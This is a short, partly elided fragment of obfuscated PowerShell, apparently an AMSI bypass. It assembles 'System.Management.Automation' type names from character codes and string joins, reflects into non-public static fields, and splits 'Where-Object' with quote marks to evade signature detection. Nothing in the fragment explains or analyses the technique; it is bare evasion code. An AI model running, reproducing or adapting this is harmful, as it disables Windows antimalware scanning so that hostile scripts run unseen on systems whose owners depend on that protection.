...
$b2 = "[char]110 + [char]97 + [char]103 + [char]101 + [char]109 +[char]101 + [char]110 + [char]116 + [char]46 + [char]65 + [char]117 + [char]116 +[char]111 + [char]109 + [char]97"
...
$b3_exp = .($ama -join"")($b3)
$c_exp = .($ama -join"")($c)
$a = [Ref].Assembly.GetType($b_exp+ $b2_exp + $b3_exp).GetFields("NonPublic,Static") | Whe''re-Ob''Je''cT { $_.Name -like $c_exp }
